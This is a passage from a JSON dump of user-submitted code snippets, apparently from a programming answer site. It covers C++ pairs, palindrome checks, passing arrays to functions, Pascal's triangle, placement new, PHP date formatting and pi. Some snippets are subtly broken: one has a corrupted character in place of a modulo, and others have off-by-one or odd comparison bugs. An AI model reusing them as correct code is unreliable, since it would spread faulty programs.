    "description": "// make_pair example #include <utility>      // std::pair #include <iostream>     // std::cout  int main () {   std::pair <int,int> foo;   std::pair <int,int> bar;    foo = std::make_pair (10,20);   bar = std::make_pair (10.5,'A'); // ok: implicit conversion from pair<double,char>    std::cout << \"foo: \" << foo.first << \", \" << foo.second << '\\n';   std::cout << \"bar: \" << bar.first << \", \" << bar.second << '\\n';    return 0; }\n// CPP program to illustrate pair STL #include <iostream> #include <utility> using namespace std;  int main() { \tpair<int, char> PAIR1;  \tPAIR1.first = 100; \tPAIR1.second = 'G';  \tcout << PAIR1.first << \" \"; \tcout << PAIR1.second << endl;  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3237,
    "keyword": null,
    "link": null,
    "title": " pairs in c++",
    "description": "// make_pair example #include <utility>      // std::pair #include <iostream>     // std::cout  int main () {   std::pair <int,int> foo;   std::pair <int,int> bar;    foo = std::make_pair (10,20);   bar = std::make_pair (10.5,'A'); // ok: implicit conversion from pair<double,char>    std::cout << \"foo: \" << foo.first << \", \" << foo.second << '\\n';   std::cout << \"bar: \" << bar.first << \", \" << bar.second << '\\n';    return 0; }\npair (data_type1, data_type2) Pair_name\n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3238,
    "keyword": null,
    "link": null,
    "title": " palindrome",
    "description": "function isPalindrome(sometext) {   var replace = /[.,'!?\\- \\\"]/g; //regex for what chars to ignore when determining if palindrome   var text = sometext.replace(replace, '').toUpperCase(); //remove toUpperCase() for case-sensitive   for (var i = 0; i < Math.floor(text.length/2) - 1; i++) {     if(text.charAt(i) == text.charAt(text.length - 1 - i)) {       continue;     } else {       return false;     }   }   return true; } //EDIT: found this on https://medium.com/@jeanpan/javascript-splice-slice-split-745b1c1c05d2 //, it is much more elegant: function isPalindrome(str) {   return str === str.split('').reverse().join('');  } //you can still add the regex and toUpperCase() if you don't want case sensitive\n// devuelve cierto si la subcadena que hay entre las posiciones inicio y fin es palindromo.   bool esPalindromo(char cad[], int inicio, int fin){     bool pal = false;      if(inicio == fin){       pal = true;     }else{       if(cad[inicio] == cad[fin]){         pal = esPalindromo(cad, inicio + 1, fin - 1);       }     }      return pal;   }\n//made by Kashish Vaid the great. // Palindrome programme using for loop the easiest prgm #include <stdio.h> int main() {     int n, rev = 0, remainder, num;     printf(\"Enter an integer: \");     scanf(\"%d\", &n);     num = n;      // reversed integer is stored in rev   for(num = n ; n!=0 ; n/=10) {     remainder = n\u0010;     rev = rev*10 + remainder; } // if else shortcuts     ( (rev == num) ? printf(\"%d is a palindrome.\", num) : printf(\"%d is not a palindrome.\", num) );     return 0; } //made by Kashish Vaid the great.\n#include<iostream> #include<string> #include<algorithm> bool IsPalindrome_true_false(const std::string& );  int main () {          std::cout<<\"Please enter a string:\\t\";     std::string str;     getline(std::cin, str);          // convert the string from uppercase to lowercase      int i = 0;     while(str[i])     {         if(str[i] == std::toupper(str[i]) && std::isalpha(str[i]) == 1024)         str[i]+= 32;         ++i;     }     // looping while string is empty      while(str.empty())     {         std::cout<<\"\\nPlease enter a string your string is empty:\\t\";         if(!str.empty())         std::string str;         getline(std::cin, str);     }          std::cout<<\"\\n\"<<std::boolalpha<<IsPalindrome_true_false(str)<<std::endl;     std::cout<<std::endl;      return 0; }  // check if string is a palindrome and return true or false  bool IsPalindrome_true_false(const std::string& str) {      int i = 0;                     int j = str.length() - 1;       while(i <= j )     {                     if(std::isalpha(str[i]) == 0){             ++i;             continue;         }else if(std::isalpha(str[j]) == 0){             --j;             continue;         }            if(str[i] != str[j]){                     return false;         }         ++i;         --j;     }       return true; }    \nfunction isPalindrome(text) {   return [...text].reverse().join('') === text; }  isPalindrome = text => { \treturn [...text].reverse().join('') === text; }  isPalindrome = text => [...text].reverse().join('') === text;\n#include <stdio.h> int main() {     int n, reversedN = 0, remainder, originalN;     printf(\"Enter an integer: \");     scanf(\"%d\", &n);     originalN = n;      // reversed integer is stored in reversedN     while (n != 0) {         remainder = n % 10;         reversedN = reversedN * 10 + remainder;         n /= 10;     }      // palindrome if orignalN and reversedN are equal     if (originalN == reversedN)         printf(\"%d is a palindrome.\", originalN);     else         printf(\"%d is not a palindrome.\", originalN);      return 0; }  \n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3239,
    "keyword": null,
    "link": null,
    "title": " palindrome c++",
    "description": "string input;  cout << \"Please enter a string: \"; cin >> input;  if (input == string(input.rbegin(), input.rend())) {     cout << input << \" is a palindrome\"; } \n#include<iostream> #include<string> #include<algorithm> bool IsPalindrome_true_false(const std::string& ); int main () {          std::cout<<\"Please enter a string:\\t\";     std::string str;     getline(std::cin, str);          // convert the string from uppercase to lowercase      int i = 0;     while(str[i])     {         if(str[i] == std::toupper(str[i]) && std::isalpha(str[i]) == 1024)         str[i]+= 32;         ++i;     }     // looping while string is empty      while(str.empty())     {         std::cout<<\"\\nPlease enter a string your string is empty:\\t\";         if(!str.empty())         std::string str;         getline(std::cin, str);     }          std::cout<<\"\\n\"<<std::boolalpha<<IsPalindrome_true_false(str)<<std::endl;     std::cout<<std::endl;      return 0; }  // check if string is a palindrome and return true or false  bool IsPalindrome_true_false(const std::string& str) {      int i = 0;                     int j = str.length() - 1;       while(i <= j )     {                     if(std::isalpha(str[i]) == 0){             ++i;             continue;         }else if(std::isalpha(str[j]) == 0){             --j;             continue;         }            if(str[i] != str[j]){                     return false;         }         ++i;         --j;     }       return true; }    \n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3240,
    "keyword": null,
    "link": null,
    "title": " palindrome cpp string",
    "description": "string input;  cout << \"Please enter a string: \"; cin >> input;  if (input == string(input.rbegin(), input.rend())) {     cout << input << \" is a palindrome\"; } \n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3241,
    "keyword": null,
    "link": null,
    "title": " palindrome no example",
    "description": "171, 181, 191, 202\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3242,
    "keyword": null,
    "link": null,
    "title": " pallindrome string",
    "description": "#include <iostream> using namespace std;  bool isPalindrome(string str) {     int j = str.length() - 1;      for (int i = 0; i < j; i++, j--)     {         if (str[i] != str[j])         {             return false;         }     }      return true; }  int main() {     string words[5] = {\"mom\", \"radar\", \"level\", \"hello\", \"one\"};     for (int i = 0; i < 5; i++)     {         if (isPalindrome(words[i]))         {             cout << words[i] << \" -> Palindrome\" << endl;         }         else         {             cout << words[i] << \" -> Not a Palindrome\" << endl;         }     }      return 0; }\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3243,
    "keyword": null,
    "link": null,
    "title": " parallelize for loop c++",
    "description": "std::vector<std::string> foo; std::for_each(     std::execution::par_unseq,     foo.begin(),     foo.end(),     [](auto&& item)     {         //do stuff with item     });\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3244,
    "keyword": null,
    "link": null,
    "title": " pascal triangle c++",
    "description": "#include <iostream> using namespace std;  int main() {     int rows, coef = 1;      cout << \"Enter number of rows: \";     cin >> rows;      for(int i = 0; i < rows; i++)     {         for(int space = 1; space <= rows-i; space++)             cout <<\"  \";          for(int j = 0; j <= i; j++)         {             if (j == 0 || i == 0)                 coef = 1;             else                 coef = coef*(i-j+1)/j;              cout << coef << \"   \";         }         cout << endl;     }      return 0; }\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3245,
    "keyword": null,
    "link": null,
    "title": " pascal triangle in c++",
    "description": "#include <iostream> using namespace std;  int main() {     int rows, coef = 1;      cout << \"Enter number of rows: \";     cin >> rows;      for(int i = 0; i < rows; i++)     {         for(int space = 1; space <= rows-i; space++)             cout <<\"  \";          for(int j = 0; j <= i; j++)         {             if (j == 0 || i == 0)                 coef = 1;             else                 coef = coef*(i-j+1)/j;              cout << coef << \"   \";         }         cout << endl;     }      return 0; }\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3246,
    "keyword": null,
    "link": null,
    "title": " pass a value to the function parameter while calling the function",
    "description": "int main() {     int n = 7;          // calling the function     // n is passed to the function as argument     printNum(n);          return 0; }\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3247,
    "keyword": null,
    "link": null,
    "title": " pass array to function c++",
    "description": "void myFunction(int param[]) {    .    .    . } \n// Program to calculate the sum of array elements by passing to a function   #include <stdio.h> float calculateSum(float age[]);  int main() {     float result, age[] = {23.4, 55, 22.6, 3, 40.5, 18};      // age array is passed to calculateSum()     result = calculateSum(age);      printf(\"Result = %.2f\", result);     return 0; }  float calculateSum(float age[]) {    float sum = 0.0;    for (int i = 0; i < 6; ++i) { \t\tsum += age[i];   }    return sum; }\n#include <iostream> using namespace std;   // function declaration: double getAverage(int arr[], int size);  int main () {    // an int array with 5 elements.    int balance[5] = {1000, 2, 3, 17, 50};    double avg;     // pass pointer to the array as an argument.    avg = getAverage( balance, 5 ) ;      // output the returned value     cout << \"Average value is: \" << avg << endl;          return 0; }\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3248,
    "keyword": null,
    "link": null,
    "title": " pass by address array in c++",
    "description": "#include <iostream> using namespace std;   // function declaration: double getAverage(int arr[], int size);  int main () {    // an int array with 5 elements.    int balance[5] = {1000, 2, 3, 17, 50};    double avg;     // pass pointer to the array as an argument.    avg = getAverage( balance, 5 ) ;      // output the returned value     cout << \"Average value is: \" << avg << endl;          return 0; }\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3249,
    "keyword": null,
    "link": null,
    "title": " pass by value and pass by reference c++",
    "description": "#include <iostream> using namespace std;  void by_value(int x) {   x *= 2; }  void by_reference(int &x) {   x *= 2; }  int main() {   int a1 = 5, a2 = 5;    cout << \"Before: a1 = \" << a1 << \", a2 = \" << a2 << \"\\n\";      by_value(a1);   by_reference(a2);    cout << \"After: a1 = \" << a1 << \", a2 = \" << a2 << \"\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:42:28.000Z"
  },
  {
    "id": 3250,
    "keyword": null,
    "link": null,
    "title": " pass map as reference c++",
    "description": "#include<map>  void function2(std::map<int, int> &temp_map); //forward declaration  void function1(){     std::map<int, int>  my_map; //automatic variable                                  //no need to make it pointer!     function2(my_map);  }  void function2(std::map<int, int> &temp_map){     //do stuff with the map } \n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3251,
    "keyword": null,
    "link": null,
    "title": " passare un array a una funzione",
    "description": "int array[4];\t\t//Dichiarazione dell'array void funzione(int array[]){} funzione(array);\t//Richiamo alla funzione\n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3252,
    "keyword": null,
    "link": null,
    "title": " passing 2d array in c++ in function",
    "description": "If you are using GCC, then you are to pass the length of the array as a parameter to the function.  void foo (int m, int arr[][m]) {     //... } However, there seems to be a bug in either the compiler or the documentation, as the above function prototype syntax only works when compiling C code, not C++ (as of gcc version 4.8.2). The only work-around I found was to use a void * parameter, and cast it int the function body:  int foo_workaround (int m, void *x) {     int (*arr)[m] = static_cast<int (*)[m]>(x);     //... } There are other solutions if you do not want to rely on a compiler extension. If you don't mind a separate allocation for each row, you can use a vector of vectors, for example:  std::vector<std::vector<int> > arr(n, std::vector<int>(m));\n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3253,
    "keyword": null,
    "link": null,
    "title": " passing 2d vector to function",
    "description": "void printFunc(vector < vector<int> > vec) {     for(int i=0; i<vec.size(); i++)  \t\tfor(int j=0; j<vec[i].size(); j++)    \t\t\tcout<<vec[i][j]<<\" \";         cout<<endl; }  int main()  {     int rows = 2;     int cols = 2;     int val = 1; \t/*creates 2d vector &ldquo;v[rows][cols]&rdquo;     and initializes all elements to &ldquo;val = 1&rdquo;*/     vector< vector<int> > v(rows, vector<int> (cols, val));   \tprintFunc(v); } \n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3254,
    "keyword": null,
    "link": null,
    "title": " passing a 2d array cpp",
    "description": "#include <iostream> #include <vector> using namespace std;  typedef vector< vector<int> > Matrix;  void print(Matrix& m) {    int M=m.size();    int N=m[0].size();    for(int i=0; i<M; i++) {       for(int j=0; j<N; j++)          cout << m[i][j] << \" \";       cout << endl;    }    cout << endl; }   int main() {     Matrix m = { {1,2,3,4},                  {5,6,7,8},                  {9,1,2,3} };     print(m);      //To initialize a 3 x 4 matrix with 0:     Matrix n( 3,vector<int>(4,0));     print(n);     return 0; } \n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3255,
    "keyword": null,
    "link": null,
    "title": " passing array to function c++ pointer",
    "description": "void myFunction(int param[]) {    .    .    . } \nvoid generateArray(int *a, int si) {     for (int j = 0; j < si; j++)         a[j] = rand() % 9; }  int main() {     const int size=5;     int a[size];      generateArray(a, size);      return 0; }\n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3256,
    "keyword": null,
    "link": null,
    "title": " passing function to another function in c++",
    "description": "#include <vector> #include <algorithm> #include <iostream>  void transform(std::vector<int>::iterator beginIt,     std::vector<int>::iterator endIt,     std::vector<int>::iterator destinationBeginIt,     int func (int)) {   while (beginIt != endIt) {     *destinationBeginIt = func(*beginIt);     beginIt++;     destinationBeginIt++;   } }  int main() {   std::vector<int> numbers{1, 2, 3}; // numbers has 3 values: 1, 2, 3   std::vector<int> bigNumbers(3); // bigNumbers has 3 values, default                                   // initialized: 0, 0, 0    transform(     numbers.begin(),     numbers.end(),     bigNumbers.begin(),     [](int small) {       return small * 10;     }   );    // Print the values of bigNumbers   for (const auto big : bigNumbers) {     std::cout << big << std::endl;   } } \n1 2 3 int func (int) int (*func) (int) int (&func) (int) \n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3257,
    "keyword": null,
    "link": null,
    "title": " passing multidimentional array pointers in c++ to functions",
    "description": "#include<iostream> using namespace std;  void processArr(int a[][2]) {    cout << \"element at index 1,1 is \" << a[1][1]; } int main() {    int arr[2][2];    arr[0][0] = 0;    arr[0][1] = 1;    arr[1][0] = 2;    arr[1][1] = 3;     processArr(arr);    return 0; }\n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3258,
    "keyword": null,
    "link": null,
    "title": " passing reference in c++",
    "description": "// C++ program to demonstrate differences between pointer  // and reference.  #include <iostream>  using namespace std;     struct demo  {      int a;  };     int main()  {      int x = 5;      int y = 6;      demo d;             int *p;      p =  &x;      p = &y;                     // 1. Pointer reintialization allowed      int &r = x;      // &r = y;                  // 1. Compile Error      r = y;                      // 1. x value becomes 6             p = NULL;                 // &r = NULL;               // 2. Compile Error             p++;                        // 3. Points to next memory location      r++;                        // 3. x values becomes 7             cout << &p << \" \" << &x << endl;    // 4. Different address      cout << &r << \" \" << &x << endl;    // 4. Same address             demo *q = &d;      demo &qq = d;             q->a = 8;      // q.a = 8;                 // 5. Compile Error       qq.a = 8;      // qq->a = 8;               // 5. Compile Error             cout << p << endl;        // 6. Prints the address      cout << r << endl;        // 6. Print the value of x             return 0;  } \n",
    "reg_date": "2021-10-12T11:42:29.000Z"
  },
  {
    "id": 3259,
    "keyword": null,
    "link": null,
    "title": " passing the value to base class constructor from derived  class c++",
    "description": "#include <iostream> #include<string>  using namespace std;  class Father{ protected:     int height; public:     Father(){     cout << \"constructor of father is called\"<<endl;      }  }; class Mother{ protected:     string skincolor; public:     Mother(){     cout << \"constructor of mother is called\"<<endl;      }  };  class Child : public Father,public Mother{ public:     Child(int x,string color) : Father(),Mother(){     height = x;     skincolor = color;     cout << \"child classs constructor\"<<endl;     } void display(){ cout << \"height is \"<<height<<\" skin color is \"<<skincolor<<endl; } };   int main() {     Child anil(24,\"while\");     anil.display();     return 0; }   \n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3260,
    "keyword": null,
    "link": null,
    "title": " patterns in c++",
    "description": "check gfg\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3261,
    "keyword": null,
    "link": null,
    "title": " pause the console c++",
    "description": "// This is only one of many ways but you can use  getchar();\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3262,
    "keyword": null,
    "link": null,
    "title": " pause thread  c++",
    "description": "// this_thread::sleep_for example #include <iostream>       // std::cout, std::endl #include <thread>         // std::this_thread::sleep_for #include <chrono>         // std::chrono::seconds   int main()  {   std::cout << \"countdown:\\n\";   for (int i=10; i>0; --i) {     std::cout << i << std::endl;     std::this_thread::sleep_for (std::chrono::seconds(1));   }   std::cout << \"Lift off!\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3263,
    "keyword": null,
    "link": null,
    "title": " pbds in c++",
    "description": "// Program showing a policy-based data structure.  #include <ext/pb_ds/assoc_container.hpp> // Common file  #include <ext/pb_ds/tree_policy.hpp>  #include <functional> // for less  #include <iostream>  using namespace __gnu_pbds;  using namespace std;     // a new data structure defined. Please refer below  // GNU link : https://goo.gl/WVDL6g  typedef tree<int, null_type, less<int>, rb_tree_tag,               tree_order_statistics_node_update>      new_data_set;     // Driver code  int main()  {      new_data_set p;      p.insert(5);      p.insert(2);      p.insert(6);      p.insert(4);         // value at 3rd index in sorted array.      cout << \"The value at 3rd index ::\"           << *p.find_by_order(3) << endl;         // index of number 6      cout << \"The index of number 6::\"           << p.order_of_key(6) << endl;         // number 7 not in the set but it will show the       // index number if it was there in sorted array.      cout << \"The index of number seven ::\"          << p.order_of_key(7) << endl;         return 0;  } \n#include <ext/pb_ds/assoc_container.hpp> #include <ext/pb_ds/tree_policy.hpp>  using namespace __gnu_pbds;  typedef tree<int, null_type, less<int>, rb_tree_tag,                     tree_order_statistics_node_update>                     ordered_set;  ordered_set ord_set;  int a; ord_set.insert(a); *ord_set.find_by_order(a); ord_set.order_of_key(a);\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3264,
    "keyword": null,
    "link": null,
    "title": " pca compact trick",
    "description": "PCA PCA_trick(const Mat& pcaset, int maxComponents) {      int n = pcaset.rows, p = pcaset.cols;      cout << \"\\tcalculating 'true' means, varance and standard deviation...\" << endl;      Mat means(1, p, CV_32FC1);      Mat variance(1, p, CV_32FC1);      for (size_t i = 0; i < p; i++)      {        float avg = mean(pcaset.col(i)).val[0];        means.at<float>(0, i) = avg;        Mat p2 = Mat(1, n, CV_32F);        for (size_t j = 0; j < n; j++)          p2.at<float>(0, j) = pow(pcaset.at<float>(j, i), 2);        variance.at<float>(0, i) = (1 / (float)n) * sum(p2).val[0] - pow(avg, 2);      }       //covariance matrix, AA', not the A'A like usual      Mat M;      Mat centred(n, p, CV_32FC1);      for (size_t i = 0; i < n; i++)        centred.row(i) = (pcaset.row(i) - means) / variance;      mulTransposed(centred, M, 0);       //compute eigenvalues and eigenvectors      PCA pca;      pca = PCA(M, cv::Mat(), CV_PCA_DATA_AS_ROW, maxComponents);       //this is the compact trick      pca.mean = means;      pca.eigenvectors = pca.eigenvectors * centred;      pca.eigenvectors = pca.eigenvectors.rowRange(Range(0, maxComponents));       return pca; }\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3265,
    "keyword": null,
    "link": null,
    "title": " pdf to text python 3",
    "description": "#!pip install tabula-py import tabula #read all table data df = tabula.read_pdf(\"sample.pdf\",pages=[1,2]) df[1]  #tabula.convert_into(\"sample.pdf\", \"sample.csv\", output_format=\"csv\")\npip install pdftotext \nfrom docx2pdf import convert  convert(\"input.docx\") convert(\"input.docx\", \"output.pdf\") convert(\"my_docx_folder/\") \npip install PyPDF2 import PyPDF2 pdfFileObject=open(r\"F:\\fileName.pdf\",'rb') pdfReader = PyPDF2.PdfFileReader(pdfFileObject) //Creating reader obj print(\" No. Of Pages :\", pdfReader.numPages)//To know no.of pages\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3266,
    "keyword": null,
    "link": null,
    "title": " peak in c++",
    "description": "// istream::peek example #include <iostream>     // std::cin, std::cout #include <string>       // std::string #include <cctype>       // std::isdigit  int main () {    std::cout << \"Please, enter a number or a word: \";   std::cout.flush();    // ensure output is written    std::cin >> std::ws;  // eat up any leading white spaces   int c = std::cin.peek();  // peek character    if ( c == EOF ) return 1;   if ( std::isdigit(c) )   {     int n;     std::cin >> n;     std::cout << \"You entered the number: \" << n << '\\n';   }   else   {     std::string str;     std::cin >> str;     std::cout << \"You entered the word: \" << str << '\\n';   }    return 0; }\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3267,
    "keyword": null,
    "link": null,
    "title": " penjanje",
    "description": "int e;\n",
    "reg_date": "2021-10-12T11:42:30.000Z"
  },
  {
    "id": 3268,
    "keyword": null,
    "link": null,
    "title": " permutation c++",
    "description": "bool next_permutation(BidirectionalIterator first, BidirectionalIterator last); bool prev_permutation(BidirectionalIterator first, BidirectionalIterator last);  //Example:  int a[]={1,2,3,4};  do { \tfor(auto& i : a) cout<<i<<\" \"; \tcout<<endl;  } while (next_permutation(a,a+4));\n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3269,
    "keyword": null,
    "link": null,
    "title": " permutation with spaces",
    "description": "#include <bits/stdc++.h>  using namespace std; void solve(string s,string op) {     if(s.size()==0)     {         cout<<op<<endl;         return;     }     string op1=op;     string op2=op;     op2+=\" \";     op1+=s[0];     op2+=s[0];     s.erase(s.begin()+0);     solve(s,op1);     solve(s,op2); } int main() {     string s;     cout<<\"Enter the  string: \";     cin>>s;     string op=\"\";     op+=s[0];     s.erase(s.begin()+0);     solve(s,op);     return 0; }  \n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3270,
    "keyword": null,
    "link": null,
    "title": " person parametr cpp",
    "description": "person *p \n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3271,
    "keyword": null,
    "link": null,
    "title": " ph vid",
    "description": "#include <mpi.h> int MPI_File_open(MPI_Comm comm, const char *filename,     int amode, MPI_Info info,     MPI_File *fh)  //MPI_File_open opens the file identified by the filename filename on all   //processes in the comm communicator group.    //MPI_File_open is a collective routine;    //all processes must provide the same value for amode,    //and all processes must provide filenames that reference the same file    //which are textually identical\n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3272,
    "keyword": null,
    "link": null,
    "title": " phoenix nested forms",
    "description": "mix phx.new nested_forms; cd nested_forms; mix phx.gen.html Users User users name:string; mix phx.gen.html Posts Post posts body:string;  # Add resources \"/users\", UserController to router # Add belongs_to :user, NestedForms.Forms.User to post.ex schema # Add has_many :posts, NestedForms.Posts.Post to user.ex schema # Replace the user_controller \"new\" action with      changeset = Users.change_user(%User{posts: [       %NestedForms.Posts.Post{}     ]})  mix ecto.create; mix ecto.migrate; mix phx.server;  # Add to lib/nested_forms_web/templates/user/form.html.eex right above the save div      <%= inputs_for f, :posts, fn p -> %>         <div class=\"form-group\">             <%= label p, :body, class: \"control-label\" %>             <%= text_input p, :body, class: \"form-control\" %>             <%= error_tag p, :body %>         </div>     <% end %>  # Open http://localhost:4000/users  # Reference: https://gist.github.com/mjrode/c2939ee7786b157aab131761c8fb89a9\n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3273,
    "keyword": null,
    "link": null,
    "title": " phph date",
    "description": "$today = date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                           // 03.10.01 $today = date(\"j, n, Y\");                         // 10, 3, 2001 $today = date(\"Ymd\");                             // 20010310 $today = date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day (10&egrave;me jour du mois). $today = date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\e\\s\\t\\ \\l\\e\\ \\m\\o\\i\\s'); // 17:03:18 m est le mois $today = date(\"H:i:s\");                           // 17:16:18 $today = date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 (le format DATETIME de MySQL)\n <?php // D&eacute;finit le fuseau horaire par d&eacute;faut &agrave; utiliser. Disponible depuis PHP 5.1 date_default_timezone_set('UTC');   // Affichage de quelque chose comme : Monday echo date(\"l\");  // Affichage de quelque chose comme : Monday 8th of August 2005 03:12:46 PM echo date('l jS \\of F Y h:i:s A');  // Affiche : July 1, 2000 is on a Saturday echo \"July 1, 2000 is on a \" . date(\"l\", mktime(0, 0, 0, 7, 1, 2000));  /* utilise les constantes dans le param&egrave;tre format */ // Affichage de quelque chose comme : Wed, 25 Sep 2013 15:28:57 -0700 echo date(DATE_RFC2822);  // Affichage de quelque chose comme : 2000-07-01T00:00:00+00:00 echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000)); ?>  \n <?php // set the default timezone to use. Available since PHP 5.1 date_default_timezone_set('UTC');   // Prints something like: Monday echo date(\"l\");  // Prints something like: Monday 8th of August 2005 03:12:46 PM echo date('l jS \\of F Y h:i:s A');  // Prints: July 1, 2000 is on a Saturday echo \"July 1, 2000 is on a \" . date(\"l\", mktime(0, 0, 0, 7, 1, 2000));  /* use the constants in the format parameter */ // prints something like: Wed, 25 Sep 2013 15:28:57 -0700 echo date(DATE_RFC2822);  // prints something like: 2000-07-01T00:00:00+00:00 echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000)); ?>  \n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3274,
    "keyword": null,
    "link": null,
    "title": " pi",
    "description": "Happy pi day to all of you!!!\n3.1415926535897932384626433832795028841971693993\n3.14159265358979323846264338327950288419716939937510582097494459230781640628\n3.14159 \n3.14159265359\n#include<iostream> #include<iomanip> // /*base(27) 29421  796842 */ ;)  int main (){    std::cout<<\"Please enter a small real number:\\t\";    double smallnumb;    std::cin>>smallnumb;    double element1{0.0f};double element2{0.0f};    double summed2{0.0f};    double n{0.0f};size_t counter{1};     while(true){       element1=(4.0f/(n+1.0f));       element2=(4.0f/(n+3.0f));       summed2+=(element1-element2);       n+=4.0f;       counter+=1;       if(element1<=smallnumb||element2<=smallnumb){           break;       }     }     std::cout<<std::fixed<<std::setprecision(10)<<summed2<<std::endl;     std::cout<<counter/2<<std::endl;     return 0 ; }  \n# pi - 25 fractional digits pi = 3.1415926535897932384626433  # pi - 50 fractional digits pi = 3.14159265358979323846264338327950288419716939937510  # pi - 100 fractional digits pi = 3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679  # pi - 1000 fractional digits pi = 3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989 \n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3275,
    "keyword": null,
    "link": null,
    "title": " pi in c++",
    "description": "#define _USE_MATH_DEFINES // must include this!   #include <cmath> #include <iostream>   int main() {    // M_PI = 3.14159265358979323846;   std::cout << M_PI << \" \" << M_E << \" \" << M_SQRT2 << endl;   return 0; }\nconst float pi = 2 * acos(0.0f);\ntypedef long double ld; const ld pi = 3.1415926535897932384626433832795;\n",
    "reg_date": "2021-10-12T11:42:31.000Z"
  },
  {
    "id": 3276,
    "keyword": null,
    "link": null,
    "title": " pick toys problem",
    "description": "//Its better to  understand the problem and write your own code :) #include <bits/stdc++.h>  using namespace std;  int main() {     string s;     cout<<\"Enter the string:\"<<endl;     cin>>s;     int k;     cout<<\"Enter the type of toys you want to pick:\"<<endl;     cin>>k;     map<char,int>mp;     int mx=INT_MIN;     int i=0;     int j=0;     int l=s.length();     while(j<l)     {         mp[s[j]]++;         if(int(mp.size())<k)         {             j++;         }         else if(int(mp.size())==k)         {             mx=max(mx,j-i+1);             j++;         }         else         {             while(int(mp.size())>k)             {                 mp.erase(s[i]);                 i++;             }             j++;         }     }     cout<<mx;     return 0; } \n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3277,
    "keyword": null,
    "link": null,
    "title": " pionter in c++",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3278,
    "keyword": null,
    "link": null,
    "title": " placement new c++",
    "description": "//placement new in c++ char *buf  = new char[sizeof(string)]; // pre-allocated buffer string *p = new (buf) string(\"hi\");    // placement new string *q = new string(\"hi\");          // ordinary heap allocation /*Standard C++ also supports placement new operator, which constructs  an object on a pre-allocated buffer. This is useful when building a  memory pool, a garbage collector or simply when performance and exception  safety are paramount (there's no danger of allocation failure since the memory has already been allocated, and constructing an object on a pre-allocated buffer takes less time): */\n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3279,
    "keyword": null,
    "link": null,
